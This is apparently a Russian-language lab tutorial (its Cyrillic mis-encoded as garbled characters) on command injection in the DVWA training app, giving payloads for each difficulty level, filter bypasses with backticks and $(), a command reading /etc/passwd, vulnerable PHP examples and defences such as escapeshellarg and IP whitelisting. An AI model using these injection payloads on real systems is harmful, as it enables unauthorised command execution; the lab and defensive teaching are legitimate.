---

## üí£ –ß—Ç–æ —Ç–∞–∫–æ–µ **Command Injection**?

–≠—Ç–æ –∫–æ–≥–¥–∞ –≤–µ–±-–ø—Ä–∏–ª–æ–∂–µ–Ω–∏–µ **–∏—Å–ø–æ–ª–Ω—è–µ—Ç —Å–∏—Å—Ç–µ–º–Ω—ã–µ –∫–æ–º–∞–Ω–¥—ã –Ω–∞ —Å—Ç–æ—Ä–æ–Ω–µ —Å–µ—Ä–≤–µ—Ä–∞**, –∏—Å–ø–æ–ª—å–∑—É—è **–Ω–µ—Ñ–∏–ª—å—Ç—Ä–æ–≤–∞–Ω–Ω—ã–µ –ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—å—Å–∫–∏–µ –¥–∞–Ω–Ω—ã–µ**. –ï—Å–ª–∏ –ø–∞—Ä–∞–º–µ—Ç—Ä –ø–µ—Ä–µ–¥–∞—ë—Ç—Å—è –Ω–∞–ø—Ä—è–º—É—é –≤ `bash`, `sh`, `system()` –∏–ª–∏ `exec()`, –º—ã –º–æ–∂–µ–º "–≤—ã—Ä–≤–∞—Ç—å—Å—è" –∏–∑ –ª–æ–≥–∏–∫–∏ –ø—Ä–∏–ª–æ–∂–µ–Ω–∏—è –∏ –≤—ã–ø–æ–ª–Ω–∏—Ç—å **–ª—é–±–æ–π shell-–∫–æ–º–∞–Ω–¥—É**.

---

## üìç **–ì–¥–µ –≤–≤–æ–¥–∏—Ç—å –∫–æ–º–∞–Ω–¥—ã –≤ DVWA?**

**DVWA > Command Injection**

```url
http://localhost:8081/vulnerabilities/exec/
```

**–§–æ—Ä–º–∞:**
"Enter an IP address to ping" ‚Üí —Å—é–¥–∞ –º–æ–∂–Ω–æ –≤—Å—Ç–∞–≤–ª—è—Ç—å payload.

---

## üß™ –ü—Ä–∏–º–µ—Ä—ã –¥–ª—è –≤—Å–µ—Ö —É—Ä–æ–≤–Ω–µ–π

### üîì Low

```bash
127.0.0.1; cat /etc/passwd
127.0.0.1 && uname -a
127.0.0.1 | ls -la
```

**–ü–æ—á–µ–º—É —Ä–∞–±–æ—Ç–∞–µ—Ç:** `ping` –≤—ã–∑—ã–≤–∞–µ—Ç—Å—è —Ç–∞–∫:

```php
system("ping -c 4 " . $_GET['ip']);
```

–ú—ã –º–æ–∂–µ–º **–≤—ã–π—Ç–∏** –∏–∑ —ç—Ç–æ–π –∫–æ–º–∞–Ω–¥—ã –∏ **–¥–æ–±–∞–≤–∏—Ç—å —Å–≤–æ—é**, –ø–æ—Ç–æ–º—É —á—Ç–æ —Å—Ç—Ä–æ–∫–∞ –∏–Ω—Ç–µ—Ä–ø—Ä–µ—Ç–∏—Ä—É–µ—Ç—Å—è –∫–∞–∫ –µ—Å—Ç—å.

---

### üü† Medium

```bash
127.0.0.1 | whoami
127.0.0.1 && id
```

**–§–∏–ª—å—Ç—Ä–∞—Ü–∏—è —á–∞—Å—Ç–∏—á–Ω–∞—è:** –≤–æ–∑–º–æ–∂–Ω–æ, –±–ª–æ–∫–∏—Ä—É—é—Ç—Å—è `;`, –Ω–æ –Ω–µ `|` –∏ `&&`. –í –∫–æ–¥–µ –º–æ–≥—É—Ç –±—ã—Ç—å –ø—Ä–æ—Å—Ç—ã–µ –ø—Ä–æ–≤–µ—Ä–∫–∏:

```php
if (preg_match('/;/', $ip)) {
    echo "Hacking attempt!";
} else {
    system("ping -c 4 $ip");
}
```

–ú—ã –ø—Ä–æ—Å—Ç–æ –∏—Å–ø–æ–ª—å–∑—É–µ–º **–¥—Ä—É–≥–∏–µ –æ–ø–µ—Ä–∞—Ç–æ—Ä—ã shell'–∞**.

---

### üîí High

```bash
127.0.0.1 && whoami
127.0.0.1 | ls /tmp
```

**–§–∏–ª—å—Ç—Ä–∞—Ü–∏—è –∂—ë—Å—Ç—á–µ**, –Ω–æ –Ω–µ –∏–¥–µ–∞–ª—å–Ω–∞—è. –°–∫–æ—Ä–µ–µ –≤—Å–µ–≥–æ —Ñ–∏–ª—å—Ç—Ä—É—é—Ç—Å—è `;`, `|`, `&&`, `||` ‚Äî –Ω–æ –º–æ–∂–Ω–æ –∏—Å–∫–∞—Ç—å –æ–±—Ö–æ–¥—ã:

```bash
127.0.0.1 `whoami`         # –ò—Å–ø–æ–ª—å–∑—É–µ–º –±—ç–∫—Ç–∏–∫–∏
127.0.0.1 $(whoami)        # –ò–ª–∏ –ø–æ–¥—Å—Ç–∞–Ω–æ–≤–∫—É
```

–ò–Ω–æ–≥–¥–∞ –æ–±—Ö–æ–¥ —Ä–∞–±–æ—Ç–∞–µ—Ç, –µ—Å–ª–∏ –ø—Ä–æ–≤–µ—Ä–∫–∞ —Ä–µ–≥—É–ª—è—Ä–∫–∞–º–∏ –Ω–µ–¥–æ—Å—Ç–∞—Ç–æ—á–Ω–æ —Å—Ç—Ä–æ–≥–∞—è.

---

## üß™ –ö–∞–∫ –∏ **–ø–æ—á–µ–º—É —ç—Ç–æ —Ä–∞–±–æ—Ç–∞–µ—Ç**

–í –æ—Ç–ª–∏—á–∏–µ –æ—Ç SQLi –∏ XSS, –∑–¥–µ—Å—å —Ç—ã **–≤–Ω–µ–¥—Ä—è–µ—à—å –∫–æ–¥ –ø—Ä—è–º–æ –≤ shell**.

* –ü—Ä–æ–≥—Ä–∞–º–º–∞ –Ω–∞ —Å–µ—Ä–≤–µ—Ä–µ (–Ω–∞ PHP, Python, –∏ —Ç.–¥.) –≤—ã–∑—ã–≤–∞–µ—Ç **shell-–∫–æ–º–∞–Ω–¥—É**, –∫–∞–∫ –ø—Ä–∞–≤–∏–ª–æ, —á–µ—Ä–µ–∑:

  * `system()`
  * `exec()`
  * `shell_exec()`
  * `popen()`
* –ï—Å–ª–∏ **—Ç–≤–æ–π –≤–≤–æ–¥** –Ω–µ —ç–∫—Ä–∞–Ω–∏—Ä—É–µ—Ç—Å—è –∏ –Ω–µ –≤–∞–ª–∏–¥–∏—Ä—É–µ—Ç—Å—è, —Ç—ã –º–æ–∂–µ—à—å –¥–æ–ø–∏—Å–∞—Ç—å —Å–≤–æ—é –∫–æ–º–∞–Ω–¥—É.
* –í—Å—ë —ç—Ç–æ **–≤—ã–ø–æ–ª–Ω—è–µ—Ç—Å—è –æ—Ç –∏–º–µ–Ω–∏ –≤–µ–±-—Å–µ—Ä–≤–µ—Ä–∞ (–æ–±—ã—á–Ω–æ www-data)** ‚Üí —Ç—ã –º–æ–∂–µ—à—å —á–∏—Ç–∞—Ç—å —Ñ–∞–π–ª—ã, –∑–∞–ø—É—Å–∫–∞—Ç—å –ø—Ä–æ—Ü–µ—Å—Å—ã, –∏–Ω–æ–≥–¥–∞ –¥–∞–∂–µ –ø–æ–ª—É—á–∏—Ç—å reverse shell.

---

## üõ°Ô∏è –ó–∞—â–∏—Ç–∞ –æ—Ç Command Injection

### ‚úÖ –ü–æ–¥—Ö–æ–¥ ‚Ññ1: **–ù–∏–∫–æ–≥–¥–∞ –Ω–µ –≤—ã–∑—ã–≤–∞–π shell –Ω–∞–ø—Ä—è–º—É—é**

–ü–æ–ª—å–∑—É–π—Å—è **API** –∏–ª–∏ **–≤—Å—Ç—Ä–æ–µ–Ω–Ω—ã–º–∏ —Å—Ä–µ–¥—Å—Ç–≤–∞–º–∏**, –∞ –Ω–µ `system()`.

```php
$ip = escapeshellarg($_GET['ip']);
system("ping -c 4 $ip");  // –º–∏–Ω–∏–º—É–º –∑–∞—â–∏—Ç–∞
```

### ‚úÖ –ü–æ–¥—Ö–æ–¥ ‚Ññ2: **–†–∞–∑–¥–µ–ª—è–π –¥–∞–Ω–Ω—ã–µ –∏ –∫–æ–¥**

–ê–Ω–∞–ª–æ–≥–∏—á–Ω–æ PDO –≤ SQL: –¥–∞–Ω–Ω—ã–µ –¥–æ–ª–∂–Ω—ã –±—ã—Ç—å –¥–∞–Ω–Ω—ã–º–∏, –∞ –Ω–µ —á–∞—Å—Ç—å—é –∫–æ–º–∞–Ω–¥—ã.

### ‚úÖ –ü–æ–¥—Ö–æ–¥ ‚Ññ3: **Whitelist + —Ç–∏–ø–∏–∑–∞—Ü–∏—è**

```php
$valid_ips = ['127.0.0.1', '192.168.0.1'];
if (in_array($_GET['ip'], $valid_ips)) {
    system("ping -c 4 " . $_GET['ip']);
}
```

–ò–ª–∏:

```php
if (filter_var($ip, FILTER_VALIDATE_IP)) {
    system("ping -c 4 $ip");
}
```

---

## üß™ –ì–¥–µ –≤–≤–æ–¥–∏–º –≤ **—Ä–µ–∞–ª—å–Ω—ã—Ö –ø—Ä–∏–ª–æ–∂–µ–Ω–∏—è—Ö**?


* **–§–æ—Ä–º—ã**, –∫–æ—Ç–æ—Ä—ã–µ –∑–∞–ø—É—Å–∫–∞—é—Ç –¥–µ–π—Å—Ç–≤–∏—è: ping, traceroute, backup, upload.
* **–ü–æ–ª—è –∫–æ–Ω—Ñ–∏–≥—É—Ä–∞—Ü–∏–∏**, –∫—É–¥–∞ –º–æ–∂–Ω–æ –≤—Å—Ç–∞–≤–∏—Ç—å –∫–æ–º–∞–Ω–¥—ã (—á–∞—Å—Ç–æ –≤ –∞–¥–º–∏–Ω–∫–∞—Ö).
* **–§—É–Ω–∫—Ü–∏–∏ –æ–±—Ä–∞–±–æ—Ç–∫–∏ —Ñ–∞–π–ª–æ–≤** ‚Äî –æ—Å–æ–±–µ–Ω–Ω–æ –ø—Ä–∏ –ø–∞—Ä—Å–∏–Ω–≥–µ –∏ –∞–≤—Ç–æ–º–∞—Ç–∏–∑–∞—Ü–∏–∏.
* **CI/CD –ø–∞–π–ø–ª–∞–π–Ω—ã** (GitLab CI, Jenkins) ‚Äî —á–∞—Å—Ç–æ —É—è–∑–≤–∏–º—ã, –µ—Å–ª–∏ –ø–µ—Ä–µ–º–µ–Ω–Ω—ã–µ –ø–æ–¥—Å—Ç–∞–≤–ª—è—é—Ç—Å—è –≤ shell –±–µ–∑ —ç–∫—Ä–∞–Ω–∏—Ä–æ–≤–∞–Ω–∏—è.

